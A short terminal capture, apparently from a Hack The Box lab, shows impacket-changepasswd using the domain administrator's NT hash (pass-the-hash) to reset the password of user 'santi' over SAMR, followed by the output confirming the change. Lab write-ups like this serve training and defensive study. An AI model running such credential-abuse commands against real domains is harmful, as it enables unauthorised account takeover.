```sh
└─$ impacket-changepasswd -ts -debug -altuser 'htb.local/administrator' -althash ':32693b11e6aa90eb43d32c72a07ceea6' -newpass '!QAZ2wsx' -reset 'htb.local/santi@10.129.164.53'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-24 09:08:16] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-24 09:08:16] [*] Setting the password of htb.local\santi as htb.local\administrator
[2025-09-24 09:08:16] [*] Connecting to DCE/RPC as htb.local\administrator
[2025-09-24 09:08:19] [+] Successfully bound to SAMR
[2025-09-24 09:08:22] [+] Sending SAMR call hSamrSetNTInternal1
[2025-09-24 09:08:22] [*] Password was changed successfully.
[2025-09-24 09:08:22] [!] User no longer has valid AES keys for Kerberos, until they change their password again.
```
